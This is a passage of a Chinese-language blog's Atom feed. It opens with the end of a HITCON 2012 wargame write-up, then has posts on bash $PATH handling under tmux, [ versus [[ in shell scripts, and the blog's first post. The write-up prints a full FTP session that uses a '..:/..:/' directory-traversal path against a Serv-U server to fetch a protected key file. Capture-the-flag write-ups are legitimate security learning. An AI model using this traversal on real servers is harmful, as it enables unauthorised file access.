<p>關鍵是 <code>Plz Input "Your" Real ID:</code> 要用 <code>wargame.hitcon.org</code> 的帳號去 generate key.txt 接下來就：</p>

<pre><code>[~] ➟  ftp jumpochisun.blogsyte.com
Connected to jumpochisun.blogsyte.com.
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (jumpochisun.blogsyte.com:dm4): hitcon2012
331 User name okay, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; get ..:/..:/..:/..:/key/dm4key.txt key.txt
local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
227 Entering Passive Mode (114,36,241,246,15,231)
150 Opening BINARY mode data connection for dm4key.txt (28 Bytes).
100% |**************************************************|    28      179.89 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (0.80 KiB/s)
</code></pre>

<p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
不過看到結束還是沒找到應該怎麼解&hellip;&hellip;</p>

<p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>

<p>爽啊！</p>

<p><a href="http://www.flickr.com/photos/51077287@N06/7635469218/" title="Flickr 上 sunrisedm4 的 hitcon-2012-wargame-socre"><img src="http://farm9.staticflickr.com/8426/7635469218_ee0dbce135.jpg" width="500" height="225" alt="hitcon-2012-wargame-socre"></a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[.bashrc sourced twice]]></title>
    <link href="http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice/"/>
    <updated>2012-05-11T21:08:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice</id>
    <content type="html"><![CDATA[<p>昨天解決了困擾了一陣子的問題，在 <code>.bashrc</code> 裡，如果有改到 <code>$PATH</code> ：</p>

<pre><code>export PATH=~/bin:$PATH
</code></pre>

<p>又因為我會用到 <a href="http://tmux.sourceforge.net/">tmux</a> ，所以在 <code>tmux</code> 裡開新的 shell 時，會再 source 一次 <code>.bashrc</code> ，本來我的解法是這樣：</p>

<pre><code>[ -z "$TMUX" ] &amp;&amp; export PATH=~/bin:$PATH
</code></pre>

<p>也就是在 <code>tmux</code> 裡新開啟的 shell 並不會再改一次 <code>$PATH</code> ，可是這樣又遇到了另一個問題：當新的 shell 打開時，本來應該被加在前面的 <code>~/bin</code> 會被接到後面去，我在想應該是開新 shell 時 bash 自己做的處理，我在 <code>/etc/bashrc</code> 裡也沒有看到相關的 script 。</p>

<p>對於這個問題我最後的解法是參考 <a href="http://perlbrew.pl/">perlbrew</a> 裡的這段 script ：</p>

<pre><code>export PATH_WITHOUT_PERLBREW="$(perl -e 'print join ":", grep { index($_, $ENV{PERLBREW_ROOT}) } split/:/,$ENV{PATH};')"

if [[ -z "$PERLBREW_PATH" ]]; then
    export PERLBREW_PATH="$PERLBREW_ROOT/bin"
fi

export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
</code></pre>

<p>最後的結果：</p>

<pre><code>export PATH="~/bin:$(perl -e 'print join ":", grep { $_ ne "~/bin" } split/:/, $ENV{PATH};')"
</code></pre>

<p><strong>Update</strong> 2012-05-13</p>

<p>為了避免 <code>~/bin</code> 和 <code>$HOME/bin</code> 混用，所以改了一下 script</p>

<pre><code>export PATH=$HOME/bin:"$(perl -e 'print join ":", grep { $_ ne "$ENV{HOME}/bin" &amp;&amp; $_ ne "~/bin" } split/:/, $ENV{PATH};')"
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[ and [[ in shell script]]></title>
    <link href="http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script/"/>
    <updated>2012-05-10T17:01:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script</id>
    <content type="html"><![CDATA[<p>終於搞懂在 shell script 裡 <code>[ ... ]</code> 和 <code>[[ ... ]]</code> 的差別了</p>

<pre><code>$ help [
[: [ arg... ]
    This is a synonym for the "test" builtin, but the last
    argument must be a literal `]', to match the opening `['.
[[ ... ]]: [[ expression ]]
    Returns a status of 0 or 1 depending on the evaluation of the conditional
    expression EXPRESSION.  Expressions are composed of the same primaries used
    by the `test' builtin, and may be combined using the following operators

        ( EXPRESSION )  Returns the value of EXPRESSION
        ! EXPRESSION    True if EXPRESSION is false; else false
        EXPR1 &amp;&amp; EXPR2  True if both EXPR1 and EXPR2 are true; else false
        EXPR1 || EXPR2  True if either EXPR1 or EXPR2 is true; else false

    When the `==' and `!=' operators are used, the string to the right of the
    operator is used as a pattern and pattern matching is performed.  The
    &amp;&amp; and || operators do not evaluate EXPR2 if EXPR1 is sufficient to
    determine the expression's value.
</code></pre>

<p>簡單的說就是要用 <code>&amp;&amp;</code>, <code>||</code>, <code>!</code>, <code>()</code> 的話要用 <code>[[ ... ]]</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First Post]]></title>
    <link href="http://blog.dm4.tw/blog/2012/05/08/first-post/"/>
    <updated>2012-05-08T00:27:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/05/08/first-post</id>
    <content type="html"><![CDATA[<p>聽說很潮來用一下傳說中的 octopress</p>

<p>本來覺得不會 ruby 怕怕的，可是還是忍不住想試試看用 <a href="http://markdown.tw">Markdown</a> 寫 blog 的感覺，一試之下才發現……也太方便了吧！</p>
]]></content>
  </entry>
  
</feed>
